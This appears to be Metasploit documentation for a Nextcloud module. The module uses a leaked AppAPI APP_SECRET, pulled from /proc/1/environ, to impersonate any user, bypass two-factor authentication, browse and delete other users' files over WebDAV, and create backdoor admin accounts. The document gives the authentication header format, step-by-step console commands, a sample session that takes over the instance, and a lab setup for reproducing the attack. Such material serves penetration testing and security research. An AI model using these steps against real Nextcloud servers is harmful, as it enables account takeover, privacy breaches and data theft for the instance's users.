## Vulnerable Application

This module exploits the Nextcloud AppAPI authentication mechanism to gain full administrative
control over a Nextcloud instance. It is designed to be used **after leaking the `APP_SECRET`**
from a vulnerable ExApp container.

### Attack Chain Context

This shell is part of a larger exploitation chain documented in CVE-2026-29059
(Nextcloud Flow Path Traversal):

1. **Leak APP_SECRET**: Use `auxiliary/gather/windmill_file_read` with `FILEPATH=/proc/1/environ`
   against a vulnerable Nextcloud Flow instance to extract the `APP_SECRET`
2. **Full Nextcloud Takeover**: Use this shell with the leaked secret to impersonate any user,
   access all files, and create admin backdoors

### Why This Works: AppAPI Design Flaw

The AppAPI scope system was **removed** in [PR #373](https://github.com/nextcloud/app_api/pull/373)
(September 2024) for "performance optimization". Previously, ExApps declared required scopes
(FILES, USER_INFO, etc.) and Nextcloud restricted access. This security feature no longer exists.

The result: **any leaked `APP_SECRET` grants unrestricted access** to the entire Nextcloud
instance, including:
- User impersonation (bypass 2FA)
- Full WebDAV access to all users' files
- Admin account creation
- Rate limit bypass

Affected versions:
* Nextcloud with AppAPI >= 3.2.0 (scopes removed)
* Any ExApp that stores `APP_SECRET` in `/proc/1/environ` (Flow, Assistant, etc.)

## How It Works

The AppAPI uses a simple authentication header: `AUTHORIZATION-APP-API: base64(userid:app_secret)`.
The `userid` can be **any valid Nextcloud user** - there is no verification that the user
consented to this ExApp. With a valid `APP_SECRET`, an attacker can:

1. **Impersonate ANY user** (including admins) - just change the userid in the header
2. **Bypass 2FA** - AppAPI requests skip two-factor authentication
3. Browse, read, upload, and delete files via WebDAV
4. Create new admin accounts
5. Enumerate shares, groups, and installed apps

## Options

### APP_SECRET (Required)
The AppAPI shared secret, typically found in `/proc/1/environ` as `APP_SECRET=<value>`.

### APP_ID
The external app identifier (Default: `flow`). Common values: `flow`, `assistant`, `context_chat`.

### APP_VERSION
The external app version (Default: `1.0.0`).

### AA_VERSION
The AppAPI protocol version (Default: `3.0.0`).

### OCS_VERSION
OCS API version to use. Version `2` returns proper HTTP status codes, version `1` is legacy (Default: `2`).

## Verification Steps

1. Start msfconsole
2. `use auxiliary/admin/http/nextcloud_appapi_shell`
3. `set RHOSTS <target>`
4. `set RPORT 443`
5. `set SSL true`
6. `set APP_SECRET <leaked_secret>`
7. `run`

## Shell Commands

### User Management

| Command                 | Description                           |
|-------------------------|---------------------------------------|
| `users`                 | List all users                        |
| `admins`                | List admin users                      |
| `su <user>`             | Switch to impersonate another user    |
| `whoami`                | Show current impersonated user        |
| `adduser <user> <pass>` | Create a new user                     |
| `addadmin [user] [pass]`| Create admin (auto-generates if empty)|

### File Operations (WebDAV)

| Command                 | Description                          |
|-------------------------|--------------------------------------|
| `ls [path]`             | List files in directory              |
| `cd <path>`             | Change directory                     |
| `pwd`                   | Print working directory              |
| `cat <file>`            | Display file contents                |
| `download <file> [local]`| Download a file                     |
| `upload <local> [remote]`| Upload a file                       |
| `mkdir <dir>`           | Create directory                     |
| `rm <path>`             | Delete file or directory             |
| `mv <src> <dst>`        | Move/rename                          |
| `cp <src> <dst>`        | Copy                                 |
| `search <query>`        | Search files by name                 |

### Enumeration

| Command   | Description                          |
|-----------|--------------------------------------|
| `shares`  | List all file shares                 |
| `groups`  | List groups and members              |
| `apps`    | List installed apps                  |
| `version` | Show server version and capabilities |

### Tips
- Use **TAB** for auto-completion (commands, paths, users)
- Use quotes for paths with spaces: `cat "my file.txt"`

## Scenarios

### Example: Full Compromise via Leaked APP_SECRET

```
msf6 > use auxiliary/admin/http/nextcloud_appapi_shell
msf6 auxiliary(admin/http/nextcloud_appapi_shell) > set RHOSTS 192.168.1.100
RHOSTS => 192.168.1.100
msf6 auxiliary(admin/http/nextcloud_appapi_shell) > set RPORT 443
RPORT => 443
msf6 auxiliary(admin/http/nextcloud_appapi_shell) > set SSL true
SSL => true
msf6 auxiliary(admin/http/nextcloud_appapi_shell) > set APP_SECRET nXmiLwie59XUsRXWv7dUf1nFLC1DKIDMDtzbUsQvuqd1n6Dpxdr...
APP_SECRET => nXmiLwie59XUsRXWv7dUf1nFLC1DKIDMDtzbUsQvuqd1n6Dpxdr...
msf6 auxiliary(admin/http/nextcloud_appapi_shell) > run
[*] Running module against 192.168.1.100
[*] Connecting to 192.168.1.100:443...
[+] Connected! Found 10 users

  _   _           _       _                 _
 | \ | | _____  _| |_ ___| | ___  _   _  __| |
 |  \| |/ _ \ \/ / __/ __| |/ _ \| | | |/ _` |
 | |\  |  __/>  <| || (__| | (_) | |_| | (_| |
 |_| \_|\___/_/\_\\__\___|_|\___/ \__,_|\__,_|

  AppAPI Shell v1.0 - Type 'help' for commands

[*] APP_ID: flow
[+] Admin: admin
[*] User: admin

nc(admin)> users
[*] Fetching users...

Users
=====

  Username   Role
  --------   ----
  admin      admin
  alice      user
  bob        user

Total: 3 (1 admins)

nc(admin)> ls
/
=

  Type  Size       Name
  ----  ----       ----
  DIR              Documents/
  DIR              Photos/
  FILE  197B       Readme.md

nc(admin)> cat Readme.md
## Welcome to Nextcloud!
...

nc(admin)> download Readme.md /tmp/readme.md
[+] Downloaded 197 bytes to /tmp/readme.md

nc(admin)> addadmin
[*] Auto-generating credentials...
[+] Created admin: adm_x7k9z / P@ssw0rd!Kj8#mN2$
[+] Login at: https://192.168.1.100/login

nc(admin)> exit
[*] Exiting Nextcloud shell...
[*] Auxiliary module execution completed
```

### Example: Accessing Another User's Files

```
nc(admin)> su alice
[+] Switched to: alice

nc(alice)> pwd
alice:/

nc(alice)> ls
/
=

  Type  Size    Name
  ----  ----    ----
  DIR           Private/
  FILE  1024B   secret.txt

nc(alice)> cat secret.txt
This is Alice's private data...

nc(alice)> su admin
[+] Switched to: admin
```

## Lab Setup

This module requires a leaked `APP_SECRET` from a Nextcloud ExApp container (Flow, Assistant, etc.).

### Nextcloud with Flow

**Prerequisites:** Add to `/etc/hosts`:
```bash
sudo sh -c 'echo "127.0.0.1 localhost.local" >> /etc/hosts'
```

Create directory structure:
```bash
mkdir -p nginx
```

Create `docker-compose.yml`:

```yaml
services:
  nextcloud-aio-mastercontainer:
    image: nextcloud/all-in-one:latest
    init: true
    restart: always
    container_name: nextcloud-aio-mastercontainer
    volumes:
      - nextcloud_aio_mastercontainer:/mnt/docker-aio-config
      - /var/run/docker.sock:/var/run/docker.sock:ro
    ports:
      - "8180:8080"
    environment:
      - APACHE_PORT=11000
      - APACHE_IP_BINDING=0.0.0.0
      - NEXTCLOUD_DATADIR=/mnt/ncdata
      - SKIP_DOMAIN_VALIDATION=true

  nginx-proxy:
    image: nginx:alpine
    container_name: nextcloud-nginx-proxy
    restart: always
    ports:
      - "443:443"
    volumes:
      - ./nginx/nginx.conf:/etc/nginx/nginx.conf:ro
      - ./nginx/ssl.crt:/etc/nginx/ssl/ssl.crt:ro
      - ./nginx/ssl.key:/etc/nginx/ssl/ssl.key:ro
    networks:
      - default
      - nextcloud-aio

volumes:
  nextcloud_aio_mastercontainer:
    name: nextcloud_aio_mastercontainer

networks:
  nextcloud-aio:
    name: nextcloud-aio
    external: true
```

Create `nginx/nginx.conf`:

```nginx
events {
    worker_connections 1024;
}

http {
    server {
        listen 443 ssl;
        server_name localhost.local;

        ssl_certificate /etc/nginx/ssl/ssl.crt;
        ssl_certificate_key /etc/nginx/ssl/ssl.key;

        location / {
            proxy_pass http://nextcloud-aio-apache:11000;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto https;
            proxy_set_header X-Forwarded-Port 443;
            proxy_buffering off;
            proxy_request_buffering off;
            client_max_body_size 0;
        }
    }
}
```

Generate self-signed SSL certificate:

```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout nginx/ssl.key -out nginx/ssl.crt \
  -subj "/CN=localhost.local"
```

**Nextcloud AIO Configuration:**

1. `docker compose up -d`
2. Open **https://localhost:8180** (accept self-signed certificate)
3. Note the generated passphrase
4. Enter domain: **`localhost.local`**
5. In **Optional containers**, enable **Docker Socket Proxy**
6. Click **Submit** then **Start containers**
7. Wait for all containers to be "Running" (5-10 min)
8. Create network: `docker network create nextcloud-aio`
9. Connect nginx: `docker network connect nextcloud-aio nextcloud-nginx-proxy`
10. Restart nginx: `docker restart nextcloud-nginx-proxy`
11. Access Nextcloud: **https://localhost.local**
12. In Nextcloud → **Apps** → Search **"Flow"** → **Install**

**Leak APP_SECRET:**

```bash
docker exec nc_app_flow cat /proc/1/environ | tr '\0' '\n' | grep APP_SECRET  # Get the APP_SECRET
```

## References

* [PR #373 - Scope Removal](https://github.com/nextcloud/app_api/pull/373) - The PR that removed AppAPI scopes
* [AppAPI Authentication Docs](https://docs.nextcloud.com/server/latest/developer_manual/exapp_development/tech_details/Authentication.html)
* [Nextcloud OCS API](https://docs.nextcloud.com/server/latest/developer_manual/client_apis/OCS/)
* [Nextcloud WebDAV API](https://docs.nextcloud.com/server/latest/developer_manual/client_apis/WebDAV/)
